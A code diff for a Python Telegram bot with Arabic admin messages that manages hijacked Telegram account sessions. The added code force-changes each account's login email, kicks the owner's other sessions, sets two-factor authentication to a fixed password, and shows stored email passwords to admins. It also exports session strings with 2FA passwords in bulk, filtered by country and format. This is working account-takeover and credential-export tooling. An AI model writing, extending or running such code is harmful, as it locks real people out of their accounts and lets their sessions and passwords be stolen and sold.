@@ -1,5 +1,6 @@
 import asyncio
 import logging
+import re
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery, Contact, BufferedInputFile,
@@ -129,11 +130,34 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
     live = await session_manager.check_session_alive(phone)
     live_stat = "🟢 متصلة الآن" if live else "🔴 غير متصلة الآن"
     login_mail = database.row_login_email(session) or "❌ غير مربوط"
-    mail_lines = f"📧 بريد Login: <code>{h(login_mail)}</code>"
+    mail_lines = f"📧 بريد Login (قاعدة): <code>{h(login_mail)}</code>"
     if is_admin(callback.from_user.id):
         email_pw = database.row_get(session, "email_password")
         if email_pw and login_mail != "❌ غير مربوط":
             mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
+    # قناع البريد الفعلي من تيليجرام + كشف خلط الجلسات
+    mismatch_line = ""
+    phone_check = await session_manager.verify_session_phone_match(phone)
+    if phone_check.get("match") is False:
+        actual_ph = phone_check.get("actual_phone") or "—"
+        actual_nm = phone_check.get("actual_name") or "—"
+        mismatch_line = (
+            f"\n\n⚠️ <b>تحذير: الجلسة لرقم مختلف!</b>\n"
+            f"📱 الرقم الفعلي: <code>{h(actual_ph)}</code>\n"
+            f"👤 الاسم: {h(actual_nm)}"
+        )
+    elif live:
+        try:
+            client = await session_manager.get_active_client(phone)
+            if client:
+                try:
+                    tg_pat = await session_manager.get_telegram_login_email_pattern(client)
+                    if tg_pat:
+                        mail_lines += f"\n👁 القناع الفعلي: <code>{h(tg_pat)}</code>"
+                finally:
+                    await client.disconnect()
+        except Exception:
+            pass
     secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
     
     # الخصوصية تظهر فقط للسوبر أدمن
@@ -189,6 +213,7 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
         f"📅 تاريخ التسجيل: {h(created_at)}"
         f"{maint_line}"
         f"{contacts_line}"
+        f"{mismatch_line}"
         + ADMIN_FOOTER
     )
     await callback.message.edit_text(
@@ -232,21 +257,37 @@ async def force_mail_process(callback: CallbackQuery):
         callback.message.chat.id,
         callback.message.message_id,
     )
-    # حفظ البريد القديم من قاعدة البيانات قبل التغيير
+    # حفظ البريد القديم: من القاعدة + القناع الفعلي من تيليجرام
     old_email = database.row_login_email(session) or "—"
+    tg_pattern = "—"
+    try:
+        client = await session_manager.get_active_client(phone)
+        if client:
+            try:
+                tg_pattern = (
+                    await session_manager.get_telegram_login_email_pattern(client)
+                ) or "—"
+            finally:
+                await client.disconnect()
+    except Exception:
+        pass
 
     try:
         res = await session_manager.change_login_email(phone, force=True)
     except Exception as e:
         logging.exception("force_mail %s: %s", phone, e)
         res = {"success": False, "error": str(e)}
+
+    tg_pattern = res.get("tg_pattern") or tg_pattern or "—"
+    old_email = res.get("old_email") or old_email
     
     if res["success"]:
         new_email = res.get("email", "")
         await callback.message.edit_text(
             f"✅ تم تغيير البريد إجبارياً\n\n"
             f"📞 الرقم: <code>{h(phone)}</code>\n"
-            f"📤 البريد القديم: <code>{h(old_email)}</code>\n"
+            f"👁 القناع الفعلي على تيليجرام: <code>{h(tg_pattern)}</code>\n"
+            f"📤 البريد في القاعدة: <code>{h(old_email)}</code>\n"
             f"✅ البريد الجديد: <code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
@@ -254,7 +295,8 @@ async def force_mail_process(callback: CallbackQuery):
     else:
         await callback.message.edit_text(
             f"❌ فشل العملية: <code>{h(res['error'])}</code>\n\n"
-            f"📤 البريد القديم (في قاعدة البيانات): <code>{h(old_email)}</code>" + ADMIN_FOOTER,
+            f"👁 القناع الفعلي: <code>{h(tg_pattern)}</code>\n"
+            f"📤 البريد في القاعدة: <code>{h(old_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
@@ -683,7 +725,7 @@ async def _on_admin_event(phone: str, event: str, **data):
             base
             + "🛡️ <b>بدء خط التأمين</b>\n"
             + mail
-            + f"\n\n⏳ الترتيب: طرد الجلسات → 2FA (<code>{h(DEFAULT_2FA_PASSWORD)}</code>) بعد نجاح الطرد"
+            + "\n\n⏳ الترتيب: طرد الجلسات → تفعيل التحقق بعد نجاح الطرد"
         )
     elif event == "kick_started":
         text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ انتظار 24 ساعة..."
@@ -701,14 +743,30 @@ async def _on_admin_event(phone: str, event: str, **data):
             + f"<code>{h(data.get('error', ''))}</code>"
         )
     elif event == "kick_success":
-        text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل 2FA..."
-    elif event == "twofa_ok":
-        if data.get("skipped"):
-            text = base + f"🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (<code>{h(DEFAULT_2FA_PASSWORD)}</code>)"
+        text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل التحقق..."
+    elif event == "email_after_kick":
+        if data.get("success"):
+            old_e = data.get("tg_pattern") or data.get("old_email") or "—"
+            new_e = data.get("new_email") or "—"
+            text = (
+                base
+                + "📧 <b>تغيير البريد بعد الطرد</b>\n"
+                + f"👁 الفعلي/القديم: <code>{h(old_e)}</code>\n"
+                + f"✅ الجديد: <code>{h(new_e)}</code>"
+            )
         else:
             text = (
                 base
-                + "🔐 <b>تم تفعيل 2FA</b>\n"
+                + "❌ <b>فشل تغيير البريد بعد الطرد</b>\n"
+                + f"<code>{h(data.get('error', ''))}</code>"
+            )
+    elif event == "twofa_ok":
+        if data.get("skipped"):
+            text = base + "🔐 <b>التحقق</b> — كان مضبوطاً مسبقاً على القيمة الثابتة"
+        else:
+            text = (
+                base
+                + "🔐 <b>تم تفعيل التحقق</b>\n"
                 + f"كلمة المرور: <code>{h(data.get('password', ''))}</code>"
             )
     elif event == "twofa_fail":
@@ -920,7 +978,7 @@ async def session_watchdog():
 # بحث الأدمن بالرقم — لما يرسل +xxx يرد بمعلومات الحساب
 # ──────────────────────────────────────────
 
-@dp.message(F.text.regexp(r"^\+?\d{7,15}$"))
+@dp.message(F.text.regexp(r"^\+?\d[\d\s\-]{6,20}\d$"))
 async def admin_phone_lookup(message: Message, state: FSMContext):
     """لما الأدمن يرسل رقم تيليفون يعرض معلومات الحساب إذا وُجد."""
     uid = message.from_user.id
@@ -934,6 +992,11 @@ async def admin_phone_lookup(message: Message, state: FSMContext):
 
     raw = (message.text or "").strip()
     phone = database.normalize_phone(raw)
+    # تأكد أنه رقم حقيقي بعد التنظيف (7–15 رقم)
+    digits = re.sub(r"\D", "", phone)
+    if not (7 <= len(digits) <= 15):
+        return
+
     session = await database.get_session_by_phone(phone)
     if not session:
         await message.answer(
@@ -944,6 +1007,10 @@ async def admin_phone_lookup(message: Message, state: FSMContext):
 
     # التحقق من صلاحية الأدمن للوصول لهذه الجلسة
     if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_IDS):
+        await message.answer(
+            f"❌ الرقم <code>{h(phone)}</code> غير متاح لحسابك." + ADMIN_FOOTER,
+            parse_mode="HTML",
+        )
         return
 
     # بناء صفحة المعلومات
@@ -1825,19 +1892,43 @@ async def export_secured_by_country_menu(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("sec_ctry_"))
 async def export_secured_country_handler(callback: CallbackQuery):
-    """تصدير الجلسات المؤمنة لدولة محددة."""
+    """اختيار صيغة السحب ثم تصدير الجلسات المؤمنة لدولة محددة."""
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+
+    dial_code = callback.data.removeprefix("sec_ctry_")
+    if dial_code.startswith("go_"):
+        # مسار التنفيذ بعد اختيار الصيغة
+        await export_secured_country_go(callback)
+        return
+
+    uid = callback.from_user.id
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        f"📋 <b>اختر صيغة سحب الدولة {h(dial_code)}:</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard(f"sec_ctry_go_{dial_code}", current_fmt),
+    )
+    await callback.answer()
+
+
+async def export_secured_country_go(callback: CallbackQuery):
+    """تصدير الجلسات المؤمنة لدولة محددة بعد اختيار الصيغة."""
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
 
     from phone_countries import phone_to_country
 
-    dial_code = callback.data.removeprefix("sec_ctry_")
+    raw = callback.data or ""
+    dial_code = raw.removeprefix("sec_ctry_go_")
     uid = callback.from_user.id
     all_s = await _sessions_for_admin(uid)
     is_sa = is_super_admin(uid)
+    fmt = await database.get_export_format(uid)
 
-    # فلتر: مؤمنة + صالحة + نفس الدولة
     sessions = [
         s for s in all_s
         if database.row_flag(s, "secured")
@@ -1850,18 +1941,17 @@ async def export_secured_country_handler(callback: CallbackQuery):
         await callback.answer("❌ لا توجد جلسات لهذه الدولة.", show_alert=True)
         return
 
-    # معلومات الدولة
     _, flag, country_name = phone_to_country(sessions[0]["phone"])
-
-    await callback.answer(f"⏳ جاري تجهيز {len(sessions)} جلسة...")
+    await callback.message.edit_text(
+        f"⏳ جاري تجهيز {len(sessions)} جلسة (صيغة {fmt})...",
+        parse_mode="HTML",
+    )
 
     lines = []
     for s in sessions:
-        ss = s["session_string"]
-        if not ss or not str(ss).strip():
-            ss = await session_manager.ensure_session_string(s["phone"])
-        if ss:
-            lines.append(f"{s['phone']}:{ss}")
+        line = await _build_export_line(s, fmt)
+        if line:
+            lines.append(line)
 
     if not lines:
         await callback.message.answer("❌ لا توجد أكواد جلسات لإرسالها.")
@@ -1875,7 +1965,7 @@ async def export_secured_country_handler(callback: CallbackQuery):
         document=document,
         caption=(
             f"🔒 {flag} <b>{country_name}</b>\n"
-            f"📊 عدد الجلسات: <b>{len(lines)}</b>"
+            f"📊 عدد الجلسات: <b>{len(lines)}</b> — صيغة {fmt}"
             + ADMIN_FOOTER
         ),
         parse_mode="HTML",
@@ -1883,7 +1973,24 @@ async def export_secured_country_handler(callback: CallbackQuery):
 
 
 @dp.callback_query(F.data == "export_secured_valid_two_fa")
-async def export_secured_valid_two_fa_handler(callback: CallbackQuery):
+async def export_secured_valid_two_fa_prompt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        "📋 <b>اختر صيغة سحب مؤمنة (تحقق شغال):</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard(
+            "export_secured_valid_two_fa_go", current_fmt
+        ),
+    )
+    await callback.answer()
+
+
+async def export_secured_valid_two_fa_go(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -1897,16 +2004,16 @@ async def export_secured_valid_two_fa_handler(callback: CallbackQuery):
         )
         return
 
+    fmt = await database.get_export_format(uid)
     await callback.message.edit_text(
-        "⏳ جاري تجهيز ملف الجلسات المؤمنة (تحقق شغال)...", parse_mode="HTML"
+        f"⏳ جاري تجهيز ملف الجلسات المؤمنة (تحقق شغال — صيغة {fmt})...",
+        parse_mode="HTML",
     )
     lines = []
     for s in sessions:
-        ss = s["session_string"]
-        if not ss or not str(ss).strip():
-            ss = await session_manager.ensure_session_string(s["phone"])
-        if ss:
-            lines.append(f"{s['phone']}:{ss}")
+        line = await _build_export_line(s, fmt)
+        if line:
+            lines.append(line)
 
     if not lines:
         await callback.message.edit_text("❌ لا توجد أكواد جلسات لإرسالها.")
@@ -1919,7 +2026,7 @@ async def export_secured_valid_two_fa_handler(callback: CallbackQuery):
     await callback.message.answer_document(
         document=document,
         caption=(
-            f"✅ <b>جلسات مؤمنة + تحقق شغال ({len(lines)} حساب)</b>\n"
+            f"✅ <b>جلسات مؤمنة + تحقق شغال ({len(lines)} حساب) — صيغة {fmt}</b>\n"
             f"<i>تم استبعاد الحسابات ذات التحقق غير الصالح.</i>"
             + ADMIN_FOOTER
         ),
@@ -2585,8 +2692,20 @@ async def admin_kick_sessions_only(callback: CallbackQuery):
         return
     phone, sid = session["phone"], session["id"]
 
-    # جلب البريد القديم قبل أي تعديل
+    # جلب البريد القديم قبل أي تعديل (قاعدة + قناع تيليجرام)
     old_email = database.row_login_email(session) or "—"
+    tg_pattern = "—"
+    try:
+        probe = await session_manager.get_active_client(phone)
+        if probe:
+            try:
+                tg_pattern = (
+                    await session_manager.get_telegram_login_email_pattern(probe)
+                ) or "—"
+            finally:
+                await probe.disconnect()
+    except Exception:
+        pass
 
     await callback.message.edit_text(
         "⏳ جاري طرد الجلسات الأخرى ثم تغيير البريد..." + ADMIN_FOOTER,
@@ -2606,11 +2725,14 @@ async def admin_kick_sessions_only(callback: CallbackQuery):
         except Exception:
             mail_res = {"success": False, "error": "خطأ غير متوقع"}
 
+        tg_pattern = mail_res.get("tg_pattern") or tg_pattern or "—"
+        old_email = mail_res.get("old_email") or old_email
         if mail_res.get("success"):
             new_email = mail_res.get("email") or "—"
             result_msg = (
                 f"✅ تم طرد جميع الجلسات الأخرى للرقم <code>{h(phone)}</code> بنجاح.\n\n"
-                f"📧 البريد القديم: <code>{h(old_email)}</code>\n"
+                f"👁 القناع الفعلي: <code>{h(tg_pattern)}</code>\n"
+                f"📧 البريد في القاعدة: <code>{h(old_email)}</code>\n"
                 f"✅ البريد الجديد: <code>{h(new_email)}</code>"
             )
         else:
@@ -2618,7 +2740,8 @@ async def admin_kick_sessions_only(callback: CallbackQuery):
             result_msg = (
                 f"✅ تم الطرد بنجاح، لكن فشل تغيير البريد.\n\n"
                 f"📞 الرقم: <code>{h(phone)}</code>\n"
-                f"📧 البريد القديم: <code>{h(old_email)}</code>\n"
+                f"👁 القناع الفعلي: <code>{h(tg_pattern)}</code>\n"
+                f"📧 البريد في القاعدة: <code>{h(old_email)}</code>\n"
                 f"❌ خطأ البريد: <code>{h(err)}</code>"
             )
     else:
@@ -2759,9 +2882,12 @@ async def auto_mail_process(callback: CallbackQuery):
     except Exception as e:
         logging.exception("auto_mail %s: %s", phone, e)
         res = {"success": False, "error": str(e)}
+    tg_pattern = res.get("tg_pattern") or "—"
+    old_email = res.get("old_email") or database.row_login_email(session) or "—"
     if res.get("skipped"):
         await callback.message.edit_text(
             f"ℹ️ <b>بريد Login شغال — لم يُستبدل</b>\n\n"
+            f"👁 القناع الفعلي: <code>{h(tg_pattern)}</code>\n"
             f"📧 <code>{h(res.get('email', ''))}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
@@ -2769,13 +2895,18 @@ async def auto_mail_process(callback: CallbackQuery):
     elif res["success"]:
         new_email = res.get("email", "")
         await callback.message.edit_text(
-            f"✅ تم ربط البريد:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
+            f"✅ تم ربط البريد\n\n"
+            f"👁 القناع السابق: <code>{h(tg_pattern)}</code>\n"
+            f"📤 في القاعدة: <code>{h(old_email)}</code>\n"
+            f"✅ الجديد: <code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
     else:
         await callback.message.edit_text(
-            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
+            f"❌ فشل العملية: <code>{h(res['error'])}</code>\n"
+            f"👁 القناع الفعلي: <code>{h(tg_pattern)}</code>\n"
+            f"📤 في القاعدة: <code>{h(old_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
@@ -3413,30 +3544,35 @@ async def set_export_fmt_handler(callback: CallbackQuery):
     await callback.answer(f"✅ تم حفظ الصيغة {fmt}", show_alert=False)
     # إعادة توجيه للسحب الفعلي
     callback.data = source_cb
-    # استدعاء مباشر لمعالج السحب
     if source_cb == "export_all_txt_go":
         await export_all_sessions_txt_go(callback)
     elif source_cb == "export_secured_txt_go":
         await export_secured_sessions_txt_go(callback)
     elif source_cb == "export_star_txt_go":
         await export_star_sessions_txt_go(callback)
+    elif source_cb == "export_secured_valid_two_fa_go":
+        await export_secured_valid_two_fa_go(callback)
+    elif source_cb.startswith("sec_ctry_go_"):
+        await export_secured_country_go(callback)
+    else:
+        await callback.answer("❌ مصدر سحب غير معروف", show_alert=True)
 
 
 async def _build_export_line(s, fmt: int) -> str | None:
     """يبني سطر جلسة واحدة حسب الصيغة المختارة."""
     phone = s["phone"]
-    ss = s.get("session_string")
+    ss = database.row_get(s, "session_string")
     if not ss or not str(ss).strip():
         ss = await session_manager.ensure_session_string(phone)
     if not ss:
         return None
     if fmt == 1:
         return f"{phone}:{ss}"
-    two_fa = s.get("two_fa") or ""
+    two_fa = database.row_get(s, "two_fa") or ""
     if fmt == 2:
         return f"{phone}:{ss}:{two_fa}"
     # fmt == 3
-    mutual = s.get("mutual_contacts")
+    mutual = database.row_get(s, "mutual_contacts")
     mutual_str = str(mutual) if mutual is not None else ""
     return f"{phone}:{ss}:{two_fa}:{mutual_str}"
 
